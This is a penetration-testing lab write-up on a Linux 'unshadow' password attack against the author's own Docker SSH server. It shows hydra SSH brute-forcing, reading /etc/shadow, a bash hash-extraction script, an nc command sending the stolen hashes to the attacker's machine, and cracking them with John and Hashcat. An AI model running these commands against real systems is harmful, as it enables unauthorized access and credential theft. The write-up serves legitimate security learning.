<h1 align="center"> Unshadow Attack </h1>





## What is Unshadow Attack?
**An unshadow attack** is a technique used during post-exploitation in Linux/Unix systems to crack user passwords by combining two critical files:
- `/etc/passwd`: /etc/passwd: Contains user account information (including usernames and user IDs). Historically stored password hashes here, but modern systems store only placeholder 'x' to indicate that the actual hash is in `/etc/shadow`.
- `/etc/shadow`: Stores the actual password hashes (in a hashed and often salted format) and is readable only by root.


#### The Core Concept:
An Unshadow Attack combines the /etc/passwd and /etc/shadow files to extract password hashes for cracking.

### Why It Works:
`/etc/passwd`: Contains user info (readable by all)
`/etc/shadow`: Contains password hashes (readable by root only)
When you can read BOTH files, you can extract hashes for cracking



## Understanding Linux Password Storage:
### The Old Way (Less Secure):

- `/etc/passwd`
````
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
````
- `x` means password is in `/etc/shadow`.
- All user info readable by anyone

### The Modern Way (More Secure):
- `/etc/passwd`:
````
root:x:0:0:root:/root:/bin/bash
````

- `/etc/shadow` (root only)
````
root:$6$salt$hashedpassword:19147:0:99999:7:::
daemon:*:19147:0:99999:7:::
````




### Shadow File Format:
````
username:$hashing_algorithm$salt$hash:last_changed:min_days:max_days:warn_days:inactive_days:expire_date:reserved
````
- Example Breakdown:
````
alice:$6$somesalt$abcdef123456...:19147:0:99999:7:::
      ^ ^       ^
      | |       |
      | |       └── Hash
      | └── Salt
      └── Hash Type (6 = SHA-512)
````


## Hash Types in Linux:

### Common Hash Algoritms:

| **ID** | **Algorithm**         | **Example Format** |
| ------ | --------------------- | ------------------ |
| **1**  | MD5                   | `$1$salt$hash`     |
| **2a** | Blowfish (bcrypt)     | `$2a$salt$hash`    |
| **5**  | SHA-256               | `$5$salt$hash`     |
| **6**  | SHA-512 (Most Common) | `$6$salt$hash`     |

---



# Unshadow Methodology:

- So in this I test with my `SSH Server` that i was setup in my docker:
<img width="1556" height="630" alt="image" src="https://github.com/user-attachments/assets/a4284ace-6a5d-4d3f-86ee-fc1c4d55af0f" />



## Information Gathering:

- In this I scan my target:
````
nmap 192.168.100.97 -sV -T4
````

- Now i found our target open port `SSH`.

- After i do cracking password, also in this i used with hydra:
````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -t 4 -s 2222 192.168.100.97 ssh -V -f
````
<img width="1705" height="768" alt="image" src="https://github.com/user-attachments/assets/e1d61721-2f75-4365-9a44-6f7e4f4e867c" />

<img width="924" height="574" alt="image" src="https://github.com/user-attachments/assets/a30de208-7716-4ab9-9f0a-28c900e84b7a" />

- Now i found the correct username and password.


- In this if i try to brute force others ican find `root`:
````
hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/passwd.txt -t 4 -s 2222 192.168.100.97 ssh -V -f
````
<img width="1799" height="696" alt="image" src="https://github.com/user-attachments/assets/358f31df-92a5-4757-935e-d87719bcac0b" />

<img width="897" height="576" alt="image" src="https://github.com/user-attachments/assets/cf3f7b07-382b-4c44-899a-fcf37e1601a2" />


- In this i can login both of it, Then i login to target:
````
ssh lowpriv@192.168.100.97 -p 2222
````
<img width="760" height="191" alt="image" src="https://github.com/user-attachments/assets/57a03750-6b63-4087-82f4-30eb5d30cc25" />

- Password: `k4n0ng`

- If i try `root`:
````
ssh root@192.168.100.97 -p 2222
````
<img width="851" height="227" alt="image" src="https://github.com/user-attachments/assets/3099ca3c-009b-425b-a0e6-9469b0783961" />


---




## Check shadow & Passwd file:

### Check shadow file:
- After we got root check then check shadow file:
````
cat /etc/shadow
````
<img width="1403" height="607" alt="image" src="https://github.com/user-attachments/assets/7c901acf-eb31-43a8-86fe-ee3a9dc66a98" />

- `/etc/shadow`: is a system file that stores encrypted user password hashes and account aging information (like password expiration).
- this command shows all user password hashes and related metadata

#### Format of each line:
- Each line follows this colon-separated format:
````
username:password_hash:last_change:min:max:warn:inactive:expire:reserved
````
- We’ll break down the `root` entry as an example:
````
root:$6$UrwaTDxeLHYzjjvJ$eNGkoA.fKHPWEf7fTEdIwJXzqtjinmnO3zvS53TaJjvgyawHqR0dJbUCNLIXbi.m7afLM2JGnUNgLphP4z6B7/:20408:0:99999:7:::
````
| Field                  | Value                                                  |
| ---------------------- | ------------------------------------------------------ |
| **Username**           | root                                                   |
| **Account name**       | *(empty)*                                              |
| **Password hash**      | `$6$UrwaTDxeLHYzjjvJ$eNGkoA...`                        |
| **Encrypted password** | *(see password hash)*                                  |
| **Last change**        | 20408 (days since Jan 1, 1970)                         |
| **Min**                | 0 (minimum days between password changes)              |
| **Max**                | 99999 (maximum days password is valid → ~273 years)    |
| **Warn**               | 7 (days before expiry to warn user)                    |
| **Inactive**           | *(empty)* (days after expiry before disabling account) |
| **Expire**             | *(empty)* (date the account expires)                   |
| **Reserved**           | *(empty)* (unused)                                     |


### Check Passwd file:
````
cat /etc/passwd
````
<img width="926" height="595" alt="image" src="https://github.com/user-attachments/assets/8027489b-7fca-4539-8cea-8ac5bda8e0a5" />

#### Format of Each line:
- Each line follows this colon-separated format:
````
username:password_field:UID:GID:GECOS:homedir:shell
````
- Example:
````
lowpriv:x:1000:1000::/home/lowpriv:/bin/bash
````
| **Field**          | **Value**     | **Meaning**                                              |
| ------------------ | ------------- | -------------------------------------------------------- |
| **Username**       | lowpriv       | Login name                                               |
| **Password field** | x             | Password stored securely in `/etc/shadow`                |
| **UID**            | 1000          | User ID (0 = root; 1–999 = system; ≥1000 = normal users) |
| **GID**            | 1000          | Primary group ID                                         |
| **GECOS**          | *(empty)*     | Optional info (real name, phone, etc.)                   |
| **Home directory** | /home/lowpriv | User’s home folder                                       |
| **Login shell**    | /bin/bash     | Shell executed on login                                  |

#### Key Observations from Your Output
- Regular User Accounts
These are real human or service accounts with login capability:
  - `root` — UID 0 → superuser
  - `lowpriv` — UID 1000 → likely a low-privilege user (common target for privilege escalation)
  - `adminuser` — UID 1001 → probably an admin account
  - `rootlike` — UID 1002 → suspicious name; could be a decoy or alternate root
All three (`lowpriv`, `adminuser`, `rootlike`) have:

  - `/bin/bash` as shell → can log in interactively
  - Home directories under `/home/`

- System/Service Accounts
UIDs < 1000 (or 65534 for `nobody`)
Shell is usually `/usr/sbin/nologin` → cannot log in
Used to run background services securely with minimal privileges

---




## Unshadow Attack:

### Obtain both Files:

#### Direct Access (If You Have Root)
- Copy file:
````
cp /etc/passwd /tmp/passwd.copy
cat /tmp/passwd.copy
````
<img width="934" height="611" alt="image" src="https://github.com/user-attachments/assets/420fbf85-d32c-4150-b863-055a9311ae60" />


````
cp /etc/shadow /tmp/shadow.copy
cat /tmp/shadow.py
````
<img width="1405" height="619" alt="image" src="https://github.com/user-attachments/assets/92339097-461f-433f-9d91-9d78901df60b" />


#### Privilege Escalation Paths
- Check if shadow is world-readable (rare)
````
ls -la /etc/shadow
````
<img width="587" height="114" alt="image" src="https://github.com/user-attachments/assets/7843a11b-b6f0-4bb5-8928-895e2876623a" />

- `/etc/shadow`: is the secure password database on linux.
- **permission**: `-rw-r-----`:
  - Root can **read / write**
  - Group `shadow` can read only.
  - Others have no access
- **Owner**: `root` -> only the superuser controls it.
- **Group**: `shadow` → special group for system utilities that need to read password hashes.
- **Size**: `1181 bytes` → the file length (depends on number of accounts).
- **Date/Time**: `Nov 16 11:28` → last modified (usually when a password was changed or a new account added).
- **File name**: `/etc/shadow` → contains hashed passwords and aging info for all accounts.


- Check SUID binaries that might read shadow:
````
find / -perm -4000 -type f 2>/dev/null | xargs strings 2>/dev/null | grep -i shadow
````
<img width="1102" height="616" alt="image" src="https://github.com/user-attachments/assets/2faf83ed-5366-41b1-9aff-a66df3eef049" />

- This command finds all **SUID binaries**, extract readable strings from them, and check if any reference `/etc/shadow`.



- Look for backus:
````
find / -name "*shadow*" -o -name "*passwd*" 2>/dev/null
````
<img width="858" height="755" alt="image" src="https://github.com/user-attachments/assets/fa7249f4-6f7a-48df-9bf2-d96b9831558e" />


````
find / -name "*.bak" -o -name "*backup*" 2>/dev/null
````
<img width="808" height="151" alt="image" src="https://github.com/user-attachments/assets/d8a5f6c8-6d44-49e2-b4a2-6449e8e28d2d" />


- Check web backup:
````
ls -la /var/backups/
````
<img width="516" height="153" alt="image" src="https://github.com/user-attachments/assets/73b60b74-614c-4a4e-8700-5d1c1bd7dd7d" />





### Extract Hashes with Unshadow:

#### Using John the Ripper's unshadow:
````
unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt
````
<img width="767" height="101" alt="image" src="https://github.com/user-attachments/assets/0fb437a0-d3e3-4fab-92f9-b112d5831261" />

- But in this it not work.


#### Manual Extraction:
````
#!/bin/bash
while IFS=: read -r user pass uid gid gecos home shell; do
    if grep -q "^$user:" /etc/shadow; then
        shadow_hash=$(grep "^$user:" /etc/shadow | cut -d: -f2)
        echo "$user:$shadow_hash:$uid:$gid:$gecos:$home:$shell"
    fi
done < /etc/passwd > /tmp/hashes.txt
````
<img width="1580" height="740" alt="image" src="https://github.com/user-attachments/assets/b833c747-42cc-42ef-8eec-eb1e37ade454" />

- Now we get success to get Hash.


### Crack the Hashes:

#### Using John the ripper:
- But in this in my target don't have `john` tool, so i need to copy hash.txt file to my kali:

- On my kali:
````
nc -lvp 4444 > hashes.txt
````
<img width="375" height="140" alt="image" src="https://github.com/user-attachments/assets/fdfc10e8-4a47-4079-a22c-1ba989f8a45d" />


- After in target:
in this i need to check my kali IP:
````
ifconfig
````
<img width="821" height="416" alt="image" src="https://github.com/user-attachments/assets/54d05400-7458-41d5-9c79-bf77e30e38a8" />

- So now my kali have IP `192.168.127.128`

````
nc 192.168.127.128 4444 < /tmp/hashes.txt
````
<img width="682" height="156" alt="image" src="https://github.com/user-attachments/assets/66dcb5ef-eb08-44ca-8dce-e4a363028455" />

- Now it will to my Attacker (kali). After go back to our attacker machine:
<img width="555" height="162" alt="image" src="https://github.com/user-attachments/assets/5381a1f4-b09e-455f-97df-e58f589b8f6b" />

- Now we got success to get file, after check file:
````
ls -la hashes.txt
````
<img width="497" height="142" alt="image" src="https://github.com/user-attachments/assets/27cead08-5342-487f-ac68-f92ea2b67c22" />

````
cat hashes.txt
````
<img width="1313" height="485" alt="image" src="https://github.com/user-attachments/assets/94eacf39-2703-4028-b84c-04155e007261" />

- Now we see the target `shadow file`.



#### Crack hash with john:
````
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt
````
<img width="845" height="245" alt="image" src="https://github.com/user-attachments/assets/39db8809-cbf5-403e-9a1a-e785f176bd27" />

- Now we got success to get target password Hash.

- To check:
````
john --show hashes.txt
````
<img width="447" height="148" alt="image" src="https://github.com/user-attachments/assets/4ebff1d6-0517-4559-ba07-f71af4f2c9e6" />

- Now we see the password of Hash.


- In this if i want to login to user:
````
su adminuser
````
<img width="360" height="87" alt="image" src="https://github.com/user-attachments/assets/fabe41e4-9d30-4880-9e7a-04c7f2676ef6" />




#### Using Hashcat:
- But in this i copy hash to one more file:
<img width="1337" height="843" alt="image" src="https://github.com/user-attachments/assets/1786eae8-aee4-46a7-938c-ccd911d3a11f" />

- After I create new HAsh file:
````
sudo mousepad hash.txt
````
<img width="259" height="111" alt="image" src="https://github.com/user-attachments/assets/056fca67-5ce5-4f2e-bc06-576ba7a97e9f" />

<img width="1163" height="291" alt="image" src="https://github.com/user-attachments/assets/4aa81dd3-8939-4bf9-990b-9ec39c682c50" />



- After crack hash:
````
hashcat -m 1800 hash.txt /usr/share/wordlists/passwd.txt -O
````
<img width="1238" height="671" alt="image" src="https://github.com/user-attachments/assets/c7a809ef-011f-4275-8c07-89d8651251f7" />

<img width="949" height="436" alt="image" src="https://github.com/user-attachments/assets/fe980b7e-ae27-45c6-9643-b4a1b9ae98a7" />

- Now we got succes and got the correct password Hash.
- `-m 1800`: SHA512 crypt.
- `-O`: optimized kernels (faster cracking, but max password length is 31).


- Check result
````
hashcat -m 1800 hash.txt --show
````
<img width="937" height="128" alt="image" src="https://github.com/user-attachments/assets/12485bd1-44dd-4d79-8e90-30fe80f90cbe" />

- Now we our password Hash that we was cracked.

---





## Hash Extraction TEchnique

### From Memory (if root) 

#### Extract hashes from memory (needs root)
````
cat /proc/1/root/etc/shadow
````
<img width="1423" height="600" alt="image" src="https://github.com/user-attachments/assets/fcdf45cc-7189-43f2-9bf8-cb35b945c491" />

- Now we see it the same `cat /etc/shadow`
- `/proc/1/`: refers to the process with PID 1 (usually `systemd` or `init` on Linux).
  - The `/proc` filesystem is a special virtual filesystem that exposes information about running processes.
- `root/` inside /proc/1/ → this is a symlink to the root filesystem as seen by that process.

- or we can use with `passwd`:
````
cat /proc/1/root/etc/passwd
````
<img width="913" height="589" alt="image" src="https://github.com/user-attachments/assets/8209ea8a-75d7-46ff-9cca-a64c705df446" />




### From Configuration Files

#### Some apps store hashes in config files
````
find /etc -type f -exec grep -l "\\$6\\$" {} \; 2>/dev/null
````
<img width="754" height="187" alt="image" src="https://github.com/user-attachments/assets/b1b9a40a-a469-4387-88c3-7e2d4d01c68c" />

- But in this i use with `normal user`.

---




## Password Cracking Strategies

### 1. Wordlist Attacks

#### Use John:
- But in this i was crack it in above:
````
john --wordlist=/usr/share/wordlists/passwd.txt hashes.txt
````
<img width="1084" height="126" alt="image" src="https://github.com/user-attachments/assets/66ca816e-4b3e-43f4-9e13-bb422df506a8" />

- I can't crack second with `john`, I need to clear it:
````
rm ~/.john/john.pot
````
<img width="282" height="108" alt="image" src="https://github.com/user-attachments/assets/0e8fe108-812c-4aeb-9b7a-71cd0442fa64" />


- After I can crack it again:
````
john --wordlist=/usr/share/wordlists/passwd.txt hashes.txt
````
<img width="1034" height="297" alt="image" src="https://github.com/user-attachments/assets/94fd11a6-bfd3-470e-b71e-20811e186492" />

- Now we found the correct of password Hash.


#### Using hashcat:
````
hashcat -m 1800 hash.txt /usr/share/wordlists/passwd.txt
````
<img width="1531" height="384" alt="image" src="https://github.com/user-attachments/assets/b0ef4d45-a126-4c1d-a09c-2881e1973c93" />

- But it the same above, so I need to use with profile:
````
hashcat --potfile-disable -m 1800 hash.txt /usr/share/wordlists/passwd.txt
````
<img width="1630" height="772" alt="image" src="https://github.com/user-attachments/assets/8f492839-a65b-4b72-8595-d306921775e1" />

<img width="1167" height="702" alt="image" src="https://github.com/user-attachments/assets/6efaa066-6aef-4a6c-8ab1-c821fa34cdac" />


- this my file hash.txt:
<img width="1098" height="132" alt="image" src="https://github.com/user-attachments/assets/a45a3b66-443a-42f9-81cc-8261f5a8f6e3" />




### Rule-Based Attacks

#### Use john:
````
john --wordlist=/usr/share/wordlists/passwd.txt --rules hashes.txt
````
<img width="1063" height="307" alt="image" src="https://github.com/user-attachments/assets/7ba6c9fa-5b2e-496c-a3cd-7c6155f5dfdf" />


#### Use Hashcat:
````
hashcat -m 1800 hash.txt /usr/share/wordlists/passwd.txt -r /usr/share/hashcat/rules/best66.rule
````
<img width="1519" height="385" alt="image" src="https://github.com/user-attachments/assets/30f5f9b1-f469-4a50-9af6-1b99a1c93b88" />

- But i can't crack the hash in the same file sencond, I need to clear or remove:
````
rm ~/.local/share/hashcat/hashcat.potfile
````
<img width="519" height="125" alt="image" src="https://github.com/user-attachments/assets/4a48d51e-de14-4fef-bd79-768e353d050a" />

- After I run it again:
````
hashcat -m 1800 hash.txt /usr/share/wordlists/passwd.txt -r /usr/share/hashcat/rules/best66.rule
````
<img width="1505" height="773" alt="image" src="https://github.com/user-attachments/assets/ce3411a0-10ce-4d5a-8928-2bb7319bcd8e" />

<img width="1172" height="721" alt="image" src="https://github.com/user-attachments/assets/e23810bb-c762-4dde-89b7-5cae379c99c4" />
- Now I got success to crack password Hash.


> **Important Note:** IF we want crack Hash with `John` or `Hashcat` second we need to clear old result that we was crack.

- Clear or remove with `John`
````
rm ~/.john/john.pot
````
- Clear or remove with `hashcat`:
````
rm ~/.local/share/hashcat/hashcat.potfile
````



- But in this I don't show detail about both tools, IF we want to detail about this go to my github: https://github.com/Nin-Kanong/pentest-writeups/tree/main/4.%20%20Gaining_Access/3.%20Password%20Attacks/2.%20Dictionary_Attack

---






## Privilege Escalation with Cracked Passwords

### Identify Privileged Users

#### Check /etc/passwd for users with UID 0 (root) or in sudo group
````
grep -E "(:0:)|(:.*:.*:.*:.*:.*:/bin/bash)" /etc/passwd
````
<img width="696" height="127" alt="image" src="https://github.com/user-attachments/assets/135c43f3-bc36-4ec9-853a-497035fad2c7" />

- In this I used it with `Normal User`.
- `grep -E`: Runs grep with extended regular expressions (ERE). This allows more complex regex patterns like | (OR) without escaping.


#### Check sudoers:
````
cat /etc/sudoers 2>/dev/null | grep -v "^#"
````
<img width="1041" height="353" alt="image" src="https://github.com/user-attachments/assets/8bf621f8-7e20-4a5c-a39a-685700671387" />

- In this i run with `root`.

#### Check group:
````
grep -E "(sudo|admin|lowpriv|rootlike)" /etc/group
````
<img width="785" height="145" alt="image" src="https://github.com/user-attachments/assets/6c0783a7-e292-4055-bb12-e4c59dede402" />

- `grep -E`: Uses extended regular expressions (ERE), so you can use | (OR) without escaping.

`(sudo|admin|lowpriv|rootlike)`:
- The parentheses group the alternatives.
- The `|` means OR.
- So it matches any line containing:
  - `sudo`
  - `admin`
  - `lowpriv`
  - `rootlike`.




### Try Cracked Passwords

#### If we cracked a user password
````
sudo - root
````
- Enter passswrd that we was cracked:
<img width="366" height="104" alt="image" src="https://github.com/user-attachments/assets/d599161a-9b4b-4d8f-96e7-8859baa1b788" />


#### Use su
````
su adminuser
````
<img width="512" height="133" alt="image" src="https://github.com/user-attachments/assets/4369d23c-0eb5-4552-bfa0-13b3b9c9e250" />


---





---

- For Attackers/Pentesters:
  - Check /etc/shadow permissions first
  - Look for backup files in common locations
  - Start with simple passwords before heavy cracking
  - Try password reuse across accounts/services
  - Use both John and Hashcat for best results

- For Defenders:
  - Secure /etc/shadow (chmod 640, root:shadow)
  - Regularly audit for backup files
  - Implement strong password policies
  - Use slow hashing algorithms (SHA-512)
  - Monitor for unauthorized access

---



-----


<h2 align="center"> Finished of Unshadow Attack </h2>

<h2 align="center"> Author: Nin Kanong (k4n0ng) </h2>

<h3 align="center"> Date: 10/12/2025 </h3>
